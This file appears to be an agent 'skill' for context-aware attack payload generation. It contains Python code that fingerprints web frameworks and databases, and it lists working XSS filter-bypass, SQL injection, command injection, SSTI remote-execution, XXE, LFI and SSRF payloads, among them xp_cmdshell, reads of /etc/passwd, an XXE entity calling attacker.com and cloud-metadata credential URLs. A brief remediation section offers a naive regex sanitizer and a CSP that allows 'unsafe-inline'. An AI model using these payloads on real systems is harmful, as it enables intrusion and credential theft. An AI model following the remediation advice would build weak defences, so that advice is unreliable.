---
name: payload_generation
description: Context-aware payload generation for XSS, SQL injection, command injection, and other attacks
---

# Context-Aware Payload Generation

## Overview
Effective payload generation adapts to the target environment, framework, and context. This skill provides techniques for generating payloads based on detected technologies and error patterns.

## Detection & Analysis

### 1. Framework Detection

#### Technology Fingerprinting
```python
async def detect_framework(session, url):
    """Detect web framework from response headers and content"""
    response = await session.get(url)
    headers = response.headers
    content = await response.text()
    
    detections = {
        "X-Powered-By": headers.get("X-Powered-By", ""),
        "Server": headers.get("Server", ""),
        "Set-Cookie": headers.get("Set-Cookie", ""),
    }
    
    framework_signs = {
        "django": ["csrftoken", "django", "X-Frame-Options: DENY"],
        "flask": ["session=ey", "werkzeug"],
        "rails": ["_session_id", "ruby", "phusion"],
        "express": ["connect.sid", "express"],
        "laravel": ["laravel_session", "XSRF-TOKEN"],
        "spring": ["JSESSIONID", "X-Application-Context"],
        "next.js": ["__next", "_next/static"],
        "angular": ["ng-version", "ng-app"],
        "react": ["_next", "__NEXT_DATA__"],
    }
    
    detected = []
    for framework, signs in framework_signs.items():
        for sign in signs:
            if sign in str(detections) or sign in content:
                detected.append(framework)
                break
    
    return detected
```

### 2. Error-Based Detection

#### SQL Database Detection
```python
async def detect_sql_database(session, endpoint):
    """Detect SQL database from error messages"""
    payloads = [
        "'",
        "''",
        "' OR '1'='1",
        "1' ORDER BY 1--",
        "1 UNION SELECT NULL--"
    ]
    
    db_signatures = {
        "MySQL": ["mysql", "MariaDB", "syntax error", "Unclosed quotation"],
        "PostgreSQL": ["pg", "postgresql", "ERROR: syntax error"],
        "MSSQL": ["mssql", "Microsoft", "ODBC SQL Server"],
        "Oracle": ["ORA-", "oracle", "quoted string not properly terminated"],
        "SQLite": ["sqlite", "SQLITE_ERROR"]
    }
    
    for payload in payloads:
        response = await session.get(f"{endpoint}?id={payload}")
        content = await response.text()
        
        for db, signatures in db_signatures.items():
            for sig in signatures:
                if sig.lower() in content.lower():
                    return db
    
    return None
```

## Payload Generation

### 1. XSS Payloads

#### Context-Based XSS
```python
def generate_xss_payloads(context="html"):
    """Generate XSS payloads based on context"""
    payloads = {
        "html": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
        ],
        "attribute": [
            "' onmouseover='alert(1)'",
            "\" onfocus=\"alert(1)\"",
            "' or '1'='1' onmouseover='alert(1)'",
            "javascript:alert(1)",
        ],
        "javascript": [
            "';alert(1)//",
            "\\';alert(1)//",
            "';alert(String.fromCharCode(88,83,83))//",
            "'-alert(1)-'",
            "'-alert(1)//",
        ],
        "css": [
            "expression(alert(1))",
            "url('javascript:alert(1)')",
            "behavior:url(#default#java)",
        ],
        "template": [
            "{{7*7}}",  # Template injection test
            "${7*7}",   # Expression language
            "#{7*7}",   # Ruby/SpEL
            "<%= 7*7 %>",  # ERB
        ]
    }
    
    return payloads.get(context, payloads["html"])
```

#### Filter Bypass XSS
```python
def generate_xss_bypass_payloads():
    """Generate XSS payloads that bypass common filters"""
    return [
        # Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        
        # Encoding
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "\x3cscript\x3ealert(1)\x3c/script\x3e",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        
        # Without brackets
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        
        # Without quotes
        "<script>alert`1`</script>",
        
        # Using eval
        "eval(atob('YWxlcnQoMSk='))",
        
        # Using setTimeout
        "setTimeout('alert(1)',0)",
        
        # SVG-based
        "<svg><script>alert(1)</script></svg>",
        "<svg/onload=alert(1)>",
        
        # Math-based
        "<math><mtext><table><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1)>'>"
    ]
```

### 2. SQL Injection Payloads

#### Database-Specific Payloads
```python
def generate_sql_payloads(database="generic"):
    """Generate SQL injection payloads for specific database"""
    payloads = {
        "generic": [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin'--",
            "1' OR '1'='1' LIMIT 1--",
        ],
        "mysql": [
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "LOAD_FILE('/etc/passwd')",
            "INTO OUTFILE '/tmp/test.txt'",
        ],
        "postgresql": [
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1'; SELECT pg_sleep(5)--",
            "1' AND (SELECT pg_sleep(5))::text='1'--",
            "COPY cmd_exec TO '/tmp/test.txt'",
        ],
        "mssql": [
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1'; EXEC xp_cmdshell('dir')--",
            "1'; EXEC master..xp_dirtree '\\\\attacker\\share'--",
        ],
        "sqlite": [
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1' AND 1=CAST((SELECT name FROM sqlite_master LIMIT 1) AS INT)--",
            "1' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INT)--",
        ]
    }
    
    return payloads.get(database, payloads["generic"])
```

#### Time-Based Blind SQLi
```python
def generate_time_based_payloads(database="generic"):
    """Generate time-based blind SQL injection payloads"""
    payloads = {
        "generic": [
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--",
        ],
        "mysql": [
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND IF(1=1,SLEEP(5),0)--",
            "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
        "postgresql": [
            "1'; SELECT pg_sleep(5)--",
            "1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
        ],
        "mssql": [
            "1'; WAITFOR DELAY '0:0:5'--",
            "1'; IF (1=1) WAITFOR DELAY '0:0:5'--",
        ]
    }
    
    return payloads.get(database, payloads["generic"])
```

### 3. Command Injection Payloads

#### OS-Specific Payloads
```python
def generate_command_injection_payloads(os_type="linux"):
    """Generate command injection payloads"""
    payloads = {
        "linux": [
            "; ls",
            "| ls",
            "|| ls",
            "&& ls",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; sleep 5",
            "| sleep 5",
        ],
        "windows": [
            "& dir",
            "| dir",
            "|| dir",
            "&& dir",
            "`dir`",
            "$(dir)",
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        ],
        "blind": [
            "; sleep 5",
            "| sleep 5",
            "|| sleep 5",
            "&& sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
        ]
    }
    
    return payloads.get(os_type, payloads["linux"])
```

### 4. Server-Side Template Injection (SSTI)

#### Framework-Specific Payloads
```python
def generate_ssti_payloads(framework="generic"):
    """Generate SSTI payloads for different frameworks"""
    payloads = {
        "generic": [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{self.__class__.__mro__}}",
        ],
        "jinja2": [
            "{{7*7}}",
            "{{config.items()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
        ],
        "twig": [
            "{{7*7}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        ],
        "freemarker": [
            "${7*7}",
            "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        ],
        "velocity": [
            "#set($x=7*7)$x",
            "#set($str=$class.forName('java.lang.String'))",
        ]
    }
    
    return payloads.get(framework, payloads["generic"])
```

### 5. XML External Entity (XXE)

#### XXE Payloads
```python
def generate_xxe_payloads():
    """Generate XXE payloads"""
    return [
        # Basic XXE
        """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>""",
        
        # Blind XXE
        """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>""",
        
        # XXE to SSRF
        """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>""",
        
        # Error-based XXE
        """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<foo>test</foo>"""
    ]
```

### 6. Local File Inclusion (LFI)

#### LFI Payloads
```python
def generate_lfi_payloads():
    """Generate LFI payloads"""
    return [
        # Basic traversal
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        
        # Null byte (older PHP)
        "../../../etc/passwd%00",
        
        # PHP wrappers
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://input",
        "php://filter/read=convert.base64-encode/resource=index.php",
        
        # Log poisoning
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "/var/log/auth.log",
        
        # Windows
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]
```

### 7. Server-Side Request Forgery (SSRF)

#### SSRF Payloads
```python
def generate_ssrf_payloads():
    """Generate SSRF payloads"""
    return [
        # Internal services
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0x7f000001",
        "http://2130706433",
        
        # Cloud metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        
        # Internal services
        "http://127.0.0.1:8080",
        "http://127.0.0.1:3000",
        "http://127.0.0.1:5000",
        "http://127.0.0.1:6379",  # Redis
        "http://127.0.0.1:27017",  # MongoDB
        
        # Protocols
        "file:///etc/passwd",
        "gopher://127.0.0.1:25/",
        "dict://127.0.0.1:6379/",
    ]
```

### 8. Payload Generation Tool

#### Context-Aware Payload Generator
```python
#!/usr/bin/env python3
"""Context-aware payload generator"""
import json
from typing import Dict, List, Any

class PayloadGenerator:
    def __init__(self):
        self.context = {}
    
    def analyze_response(self, response: str, headers: Dict) -> Dict:
        """Analyze response to determine context"""
        context = {
            "framework": self._detect_framework(response, headers),
            "database": self._detect_database(response),
            "language": self._detect_language(response, headers),
            "os": self._detect_os(response)
        }
        return context
    
    def _detect_framework(self, response: str, headers: Dict) -> str:
        """Detect web framework"""
        if "django" in str(headers).lower() or "csrftoken" in str(headers):
            return "django"
        elif "rails" in str(headers).lower() or "_session_id" in str(headers):
            return "rails"
        elif "express" in str(headers).lower() or "connect.sid" in str(headers):
            return "express"
        elif "laravel" in str(headers).lower() or "laravel_session" in str(headers):
            return "laravel"
        return "unknown"
    
    def _detect_database(self, response: str) -> str:
        """Detect database from error messages"""
        if "mysql" in response.lower():
            return "mysql"
        elif "postgresql" in response.lower() or "pg_" in response.lower():
            return "postgresql"
        elif "mssql" in response.lower() or "microsoft" in response.lower():
            return "mssql"
        elif "oracle" in response.lower():
            return "oracle"
        elif "sqlite" in response.lower():
            return "sqlite"
        return "unknown"
    
    def _detect_language(self, response: str, headers: Dict) -> str:
        """Detect server-side language"""
        powered_by = headers.get("X-Powered-By", "").lower()
        if "php" in powered_by:
            return "php"
        elif "asp.net" in powered_by:
            return "asp.net"
        elif "express" in powered_by:
            return "node"
        elif "python" in powered_by or "wsgi" in powered_by:
            return "python"
        return "unknown"
    
    def _detect_os(self, response: str) -> str:
        """Detect operating system"""
        if "linux" in response.lower() or "/etc/" in response:
            return "linux"
        elif "windows" in response.lower() or "c:\\" in response:
            return "windows"
        return "unknown"
    
    def generate_xss(self, context: str = "html") -> List[str]:
        """Generate context-aware XSS payloads"""
        payloads = {
            "html": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "attribute": ["' onmouseover='alert(1)'", "\" onfocus=\"alert(1)\""],
            "javascript": ["';alert(1)//", "\\';alert(1)//"],
        }
        return payloads.get(context, payloads["html"])
    
    def generate_sqli(self, database: str = "generic") -> List[str]:
        """Generate context-aware SQL injection payloads"""
        payloads = {
            "generic": ["' OR '1'='1", "' OR '1'='1'--"],
            "mysql": ["' OR 1=1--", "1' AND SLEEP(5)--"],
            "postgresql": ["' OR 1=1--", "1'; SELECT pg_sleep(5)--"],
            "mssql": ["' OR 1=1--", "1'; WAITFOR DELAY '0:0:5'--"],
        }
        return payloads.get(database, payloads["generic"])
    
    def generate_all(self, context: Dict) -> Dict[str, List[str]]:
        """Generate all payloads based on context"""
        return {
            "xss": self.generate_xss("html"),
            "sqli": self.generate_sqli(context.get("database", "generic")),
            "ssti": self.generate_ssti(context.get("framework", "generic")),
            "lfi": self.generate_lfi(),
            "ssrf": self.generate_ssrf(),
        }
    
    def generate_ssti(self, framework: str) -> List[str]:
        """Generate SSTI payloads"""
        payloads = {
            "jinja2": ["{{7*7}}", "{{config.items()}}"],
            "twig": ["{{7*7}}"],
            "freemarker": ["${7*7}"],
        }
        return payloads.get(framework, ["{{7*7}}", "${7*7}"])
    
    def generate_lfi(self) -> List[str]:
        """Generate LFI payloads"""
        return [
            "../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "/var/log/apache2/access.log",
        ]
    
    def generate_ssrf(self) -> List[str]:
        """Generate SSRF payloads"""
        return [
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
        ]

if __name__ == "__main__":
    generator = PayloadGenerator()
    
    # Example context
    context = {
        "framework": "django",
        "database": "postgresql",
        "language": "python",
        "os": "linux"
    }
    
    payloads = generator.generate_all(context)
    print(json.dumps(payloads, indent=2))
```

### 9. Remediation Guidance

#### Input Validation
```python
import re

def sanitize_input(value: str) -> str:
    """Sanitize user input"""
    # Remove HTML tags
    value = re.sub(r'<[^>]+>', '', value)
    
    # Remove special characters
    value = re.sub(r'[<>"\']', '', value)
    
    # Encode special characters
    value = value.replace('&', '&amp;')
    value = value.replace('<', '&lt;')
    value = value.replace('>', '&gt;')
    
    return value
```

#### Parameterized Queries
```python
# BAD: String concatenation
query = f"SELECT * FROM users WHERE id = '{user_id}'"

# GOOD: Parameterized query
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
```

#### Content Security Policy
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'
```

## Validation Checklist

- [ ] Context detection works for target framework
- [ ] Payloads adapted to detected technologies
- [ ] Filter bypass payloads generated
- [ ] Time-based payloads for blind injection
- [ ] Protocol-specific payloads (HTTP, file, gopher)
- [ ] Encoding variations generated
- [ ] Framework-specific SSTI payloads
